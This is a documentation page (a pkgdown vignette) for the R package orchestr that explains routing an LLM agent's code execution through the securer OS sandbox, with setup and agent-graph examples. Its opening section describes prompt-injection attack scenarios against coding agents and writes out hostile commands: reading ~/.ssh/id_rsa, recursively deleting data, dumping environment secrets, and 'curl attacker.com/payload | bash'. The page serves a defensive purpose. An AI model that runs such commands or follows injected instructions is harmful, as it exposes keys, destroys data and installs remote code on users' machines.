<!DOCTYPE html>
<!-- Generated by pkgdown: do not edit by hand --><html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Secure Execution with securer • orchestr</title>
<script src="../deps/jquery-3.6.0/jquery-3.6.0.min.js"></script><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link href="../deps/bootstrap-5.3.1/bootstrap.min.css" rel="stylesheet">
<script src="../deps/bootstrap-5.3.1/bootstrap.bundle.min.js"></script><link href="../deps/font-awesome-6.5.2/css/all.min.css" rel="stylesheet">
<link href="../deps/font-awesome-6.5.2/css/v4-shims.min.css" rel="stylesheet">
<script src="../deps/headroom-0.11.0/headroom.min.js"></script><script src="../deps/headroom-0.11.0/jQuery.headroom.min.js"></script><script src="../deps/bootstrap-toc-1.0.1/bootstrap-toc.min.js"></script><script src="../deps/clipboard.js-2.0.11/clipboard.min.js"></script><script src="../deps/search-1.0.0/autocomplete.jquery.min.js"></script><script src="../deps/search-1.0.0/fuse.min.js"></script><script src="../deps/search-1.0.0/mark.min.js"></script><!-- pkgdown --><script src="../pkgdown.js"></script><meta property="og:title" content="Secure Execution with securer">
</head>
<body>
    <a href="#main" class="visually-hidden-focusable">Skip to contents</a>


    <nav class="navbar navbar-expand-lg fixed-top bg-light" data-bs-theme="light" aria-label="Site navigation"><div class="container">

    <a class="navbar-brand me-2" href="../index.html">orchestr</a>

    <small class="nav-text text-muted me-auto" data-bs-toggle="tooltip" data-bs-placement="bottom" title="">0.1.0</small>


    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>

    <div id="navbar" class="collapse navbar-collapse ms-3">
      <ul class="navbar-nav me-auto">
<li class="nav-item"><a class="nav-link" href="../reference/index.html">Reference</a></li>
<li class="active nav-item"><a class="nav-link" href="../articles/index.html">Articles</a></li>
<li class="nav-item"><a class="nav-link" href="../news/index.html">Changelog</a></li>
      </ul>
<ul class="navbar-nav">
<li class="nav-item"><form class="form-inline" role="search">
 <input class="form-control" type="search" name="search-input" id="search-input" autocomplete="off" aria-label="Search site" placeholder="Search for" data-search-index="../search.json">
</form></li>
<li class="nav-item"><a class="external-link nav-link" href="https://github.com/ian-flores/orchestr/" aria-label="GitHub"><span class="fa fab fa-github fa-lg"></span></a></li>
      </ul>
</div>


  </div>
</nav><div class="container template-article">




<div class="row">
  <main id="main" class="col-md-9"><div class="page-header">

      <h1>Secure Execution with securer</h1>
            
      
      <small class="dont-index">Source: <a href="https://github.com/ian-flores/orchestr/blob/main/vignettes/securer.Rmd" class="external-link"><code>vignettes/securer.Rmd</code></a></small>
      <div class="d-none name"><code>securer.Rmd</code></div>
    </div>

    
    
<div class="section level2">
<h2 id="why-sandboxed-execution">Why Sandboxed Execution?<a class="anchor" aria-label="anchor" href="#why-sandboxed-execution"></a>
</h2>
<p>When an LLM agent generates and executes R code, it is running
arbitrary code on your machine. This is fundamentally different from a
human writing code in an interactive session, because the human applies
judgment about what is safe to run. The model does not have that
judgment – and worse, it can be manipulated.</p>
<p>Consider these concrete attack scenarios:</p>
<ul>
<li><p><strong>Data exfiltration</strong>: A prompt injection in a
user-uploaded CSV causes the agent to run
<code>readLines("~/.ssh/id_rsa")</code> and include the contents in its
response. The user’s private key is now in the LLM provider’s
logs.</p></li>
<li><p><strong>Filesystem destruction</strong>: The agent encounters an
error and decides to “clean up” by running
<code>unlink("/data/reports", recursive = TRUE)</code>. A momentary
hallucination just deleted your production data.</p></li>
<li><p><strong>Credential theft</strong>: The model runs
<code><a href="https://rdrr.io/r/base/Sys.getenv.html" class="external-link">Sys.getenv()</a></code> to “debug” a connection issue, exposing every
environment variable – API keys, database passwords, cloud credentials –
in its output.</p></li>
<li><p><strong>Lateral movement</strong>: The agent calls
<code>system("curl attacker.com/payload | bash")</code> to install a
“helpful package” that a prompt injection suggested.</p></li>
</ul>
<p>These are not hypothetical. Any system that executes LLM-generated
code without sandboxing is vulnerable. The <a href="https://github.com/ian-flores/securer" class="external-link">securer</a> package
provides OS-level sandboxing so that generated code cannot access the
filesystem, network, or system resources beyond what you explicitly
allow.</p>
<p>orchestr integrates with securer through the
<code>secure = TRUE</code> flag on <code><a href="../reference/Agent.html">agent()</a></code>. The interaction
between orchestr and securer looks like this:</p>
<pre><code> +------------------+       tool call       +------------------+
 |    orchestr      | -------------------&gt; |     securer       |
 |  (agent graph)   |                      |  (sandbox child)  |
 |                  |       result         |                   |
 |  Parent R proc   | &lt;------------------ |  Isolated R proc  |
 +------------------+        UDS           +------------------+
                                            |  Seatbelt (mac)  |
                                            |  bwrap (linux)   |
                                            |  env-only (win)  |
                                            +------------------+</code></pre>
<p>The parent orchestr process sends tool calls over a Unix domain
socket (UDS) to a child R process that runs inside an OS sandbox. The
child can only access what the sandbox policy allows. Results flow back
through the same socket. If the child attempts a forbidden operation,
the OS blocks it.</p>
</div>
<div class="section level2">
<h2 id="installation">Installation<a class="anchor" aria-label="anchor" href="#installation"></a>
</h2>
<div class="sourceCode" id="cb2"><pre class="downlit sourceCode r">
<code class="sourceCode R"><span><span class="co"># Install both packages</span></span>
<span><span class="fu">remotes</span><span class="fu">::</span><span class="fu">install_github</span><span class="op">(</span><span class="st">"ian-flores/securer"</span><span class="op">)</span></span>
<span><span class="fu">remotes</span><span class="fu">::</span><span class="fu">install_github</span><span class="op">(</span><span class="st">"ian-flores/orchestr"</span><span class="op">)</span></span></code></pre></div>
</div>
<div class="section level2">
<h2 id="creating-a-secure-agent">Creating a Secure Agent<a class="anchor" aria-label="anchor" href="#creating-a-secure-agent"></a>
</h2>
<p>The <code>secure = TRUE</code> and <code>sandbox = TRUE</code> flags
on <code><a href="../reference/Agent.html">agent()</a></code> tell orchestr to route tool execution through a
securer <code>SecureSession</code>. You define tools as usual – the
sandboxing is transparent to the tool implementation.</p>
<div class="sourceCode" id="cb3"><pre class="downlit sourceCode r">
<code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/orchestr/">orchestr</a></span><span class="op">)</span></span>
<span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ellmer.tidyverse.org" class="external-link">ellmer</a></span><span class="op">)</span></span>
<span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/securer/" class="external-link">securer</a></span><span class="op">)</span></span>
<span></span>
<span><span class="co"># Define a tool that runs R code in a sandbox</span></span>
<span><span class="va">code_tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer_tool</a></span><span class="op">(</span></span>
<span>  name <span class="op">=</span> <span class="st">"run_code"</span>,</span>
<span>  description <span class="op">=</span> <span class="st">"Execute R code in a sandboxed environment."</span>,</span>
<span>  args <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>code <span class="op">=</span> <span class="st">"character"</span><span class="op">)</span>,</span>
<span>  handler <span class="op">=</span> <span class="kw">function</span><span class="op">(</span><span class="va">code</span><span class="op">)</span> <span class="op">{</span></span>
<span>    <span class="fu"><a href="https://rdrr.io/r/base/eval.html" class="external-link">eval</a></span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/parse.html" class="external-link">parse</a></span><span class="op">(</span>text <span class="op">=</span> <span class="va">code</span><span class="op">)</span><span class="op">)</span></span>
<span>  <span class="op">}</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="co"># Create an agent with sandboxed execution</span></span>
<span><span class="va">secure_agent</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/Agent.html">agent</a></span><span class="op">(</span><span class="st">"code-runner"</span>,</span>
<span>  chat <span class="op">=</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span></span>
<span>    system_prompt <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/paste.html" class="external-link">paste</a></span><span class="op">(</span></span>
<span>      <span class="st">"You are a data analysis assistant."</span>,</span>
<span>      <span class="st">"Use the run_code tool to execute R code."</span>,</span>
<span>      <span class="st">"Always show your work."</span></span>
<span>    <span class="op">)</span></span>
<span>  <span class="op">)</span>,</span>
<span>  tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">code_tool</span><span class="op">)</span>,</span>
<span>  secure <span class="op">=</span> <span class="cn">TRUE</span>,</span>
<span>  sandbox <span class="op">=</span> <span class="cn">TRUE</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="co"># The agent can now safely execute LLM-generated code</span></span>
<span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">secure_agent</span><span class="op">$</span><span class="fu">invoke</span><span class="op">(</span><span class="st">"Calculate the mean of c(1, 5, 3, 7, 2) in R."</span><span class="op">)</span></span>
<span><span class="fu"><a href="https://rdrr.io/r/base/cat.html" class="external-link">cat</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
<span></span>
<span><span class="co"># Always close when done to clean up the securer session</span></span>
<span><span class="va">secure_agent</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
</div>
<div class="section level2">
<h2 id="what-the-sandbox-restricts">What the Sandbox Restricts<a class="anchor" aria-label="anchor" href="#what-the-sandbox-restricts"></a>
</h2>
<p>When <code>sandbox = TRUE</code>, the child R process runs inside an
OS sandbox:</p>
<ul>
<li>
<strong>macOS</strong>: Seatbelt profile via
<code>sandbox-exec</code>. Blocks filesystem writes outside temp,
network access, and process spawning.</li>
<li>
<strong>Linux</strong>: Bubblewrap (<code>bwrap</code>) namespace
isolation. Blocks filesystem, network, and IPC outside the sandbox.</li>
<li>
<strong>Windows</strong>: Environment isolation (clean HOME, TMPDIR,
R_LIBS_USER). No filesystem or network restrictions without admin
privileges.</li>
</ul>
<p>The sandbox operates at the OS level, which means it catches
everything – including <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> calls, compiled code, and
any R package that attempts forbidden operations. This is strictly
stronger than R-level sandboxing approaches that rely on function
blacklists, because it is enforced by the kernel.</p>
</div>
<div class="section level2">
<h2 id="mixing-secure-and-regular-tools">Mixing Secure and Regular Tools<a class="anchor" aria-label="anchor" href="#mixing-secure-and-regular-tools"></a>
</h2>
<p>In practice, not every tool needs to run in a sandbox. An agent might
need both a sandboxed code execution tool (untrusted, LLM-generated
code) and a regular API lookup tool (trusted code that you wrote).
orchestr supports this by distinguishing <code><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer_tool()</a></code>
instances from regular <code><a href="https://ellmer.tidyverse.org/reference/tool.html" class="external-link">ellmer::tool()</a></code> instances.</p>
<p>When an agent has both types, securer tools are routed to the
sandboxed child process while regular tools execute in the parent
process. This gives you the best of both worlds: untrusted code is
isolated, trusted code has full access to the network and
filesystem.</p>
<div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
<code class="sourceCode R"><span><span class="co"># Regular tool -- runs in the parent process, no sandbox</span></span>
<span><span class="va">weather_tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/tool.html" class="external-link">tool</a></span><span class="op">(</span></span>
<span>  <span class="kw">function</span><span class="op">(</span><span class="va">city</span><span class="op">)</span> <span class="fu"><a href="https://rdrr.io/r/base/paste.html" class="external-link">paste0</a></span><span class="op">(</span><span class="st">"Weather in "</span>, <span class="va">city</span>, <span class="st">": sunny, 22C."</span><span class="op">)</span>,</span>
<span>  <span class="st">"Get weather for a city."</span>,</span>
<span>  arguments <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>city <span class="op">=</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/type_boolean.html" class="external-link">type_string</a></span><span class="op">(</span><span class="st">"City name"</span><span class="op">)</span><span class="op">)</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="co"># Securer tool -- runs in the sandboxed child process</span></span>
<span><span class="va">calc_tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer_tool</a></span><span class="op">(</span></span>
<span>  name <span class="op">=</span> <span class="st">"calculate"</span>,</span>
<span>  description <span class="op">=</span> <span class="st">"Run a calculation in R."</span>,</span>
<span>  args <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>expr <span class="op">=</span> <span class="st">"character"</span><span class="op">)</span>,</span>
<span>  handler <span class="op">=</span> <span class="kw">function</span><span class="op">(</span><span class="va">expr</span><span class="op">)</span> <span class="fu"><a href="https://rdrr.io/r/base/eval.html" class="external-link">eval</a></span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/parse.html" class="external-link">parse</a></span><span class="op">(</span>text <span class="op">=</span> <span class="va">expr</span><span class="op">)</span><span class="op">)</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="va">hybrid_agent</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/Agent.html">agent</a></span><span class="op">(</span><span class="st">"hybrid"</span>,</span>
<span>  chat <span class="op">=</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span></span>
<span>    system_prompt <span class="op">=</span> <span class="st">"You can check weather and do calculations."</span></span>
<span>  <span class="op">)</span>,</span>
<span>  tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">weather_tool</span>, <span class="va">calc_tool</span><span class="op">)</span>,</span>
<span>  secure <span class="op">=</span> <span class="cn">TRUE</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="co"># The weather tool runs in-process; the calculate tool runs sandboxed</span></span>
<span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">hybrid_agent</span><span class="op">$</span><span class="fu">invoke</span><span class="op">(</span><span class="st">"What is 2^10? Also, what's the weather in London?"</span><span class="op">)</span></span>
<span><span class="va">hybrid_agent</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
</div>
<div class="section level2">
<h2 id="using-secure-agents-in-graphs">Using Secure Agents in Graphs<a class="anchor" aria-label="anchor" href="#using-secure-agents-in-graphs"></a>
</h2>
<p>Secure agents work identically to regular agents inside any graph
type. The sandboxing is handled at the tool execution layer, so the
graph runtime does not need to know or care whether an agent is
sandboxed. This means you can mix secure and non-secure agents in the
same pipeline or supervisor graph.</p>
<div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
<code class="sourceCode R"><span><span class="va">analyst</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/Agent.html">agent</a></span><span class="op">(</span><span class="st">"analyst"</span>,</span>
<span>  chat <span class="op">=</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span></span>
<span>    system_prompt <span class="op">=</span> <span class="st">"You are a data analyst. Use run_code to compute answers."</span></span>
<span>  <span class="op">)</span>,</span>
<span>  tools <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="va">code_tool</span><span class="op">)</span>,</span>
<span>  secure <span class="op">=</span> <span class="cn">TRUE</span></span>
<span><span class="op">)</span></span>
<span></span>
<span><span class="va">graph</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/react_graph.html">react_graph</a></span><span class="op">(</span><span class="va">analyst</span><span class="op">)</span></span>
<span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">graph</span><span class="op">$</span><span class="fu">invoke</span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span></span>
<span>  messages <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="st">"What is the standard deviation of c(10, 20, 30, 40, 50)?"</span><span class="op">)</span></span>
<span><span class="op">)</span><span class="op">)</span></span>
<span></span>
<span><span class="va">analyst</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
<p>You can also use <code><a href="../reference/pipeline_graph.html">pipeline_graph()</a></code> and
<code><a href="../reference/supervisor_graph.html">supervisor_graph()</a></code> with secure agents. Use
<code>verbose = TRUE</code> on <code>compile()</code> or
<code>$invoke()</code> to trace execution flow:</p>
<div class="sourceCode" id="cb6"><pre class="downlit sourceCode r">
<code class="sourceCode R"><span><span class="va">result</span> <span class="op">&lt;-</span> <span class="va">graph</span><span class="op">$</span><span class="fu">invoke</span><span class="op">(</span></span>
<span>  <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>messages <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span><span class="st">"Compute the correlation between mpg and wt in mtcars."</span><span class="op">)</span><span class="op">)</span>,</span>
<span>  verbose <span class="op">=</span> <span class="cn">TRUE</span></span>
<span><span class="op">)</span></span></code></pre></div>
</div>
<div class="section level2">
<h2 id="next-steps">Next Steps<a class="anchor" aria-label="anchor" href="#next-steps"></a>
</h2>
<ul>
<li>
<strong><a href="quickstart.html">Getting Started</a></strong> –
single-agent basics and provider setup</li>
<li>
<strong><a href="multi-agent.html">Multi-Agent
Workflows</a></strong> – pipelines and supervisors</li>
<li>
<strong><a href="tracing.html">Traced Workflows</a></strong> –
observability with securetrace</li>
<li>
<strong><a href="governed-agent.html">Governed Agent</a></strong> –
the full 7-package stack</li>
</ul>
</div>
  </main><aside class="col-md-3"><nav id="toc" aria-label="Table of contents"><h2>On this page</h2>
    </nav></aside>
</div>



    <footer><div class="pkgdown-footer-left">
  <p>Developed by Ian Flores Siaca.</p>
</div>

<div class="pkgdown-footer-right">
  <p>Site built with <a href="https://pkgdown.r-lib.org/" class="external-link">pkgdown</a> 2.2.0.</p>
</div>

    </footer>
</div>





  </body>
</html>
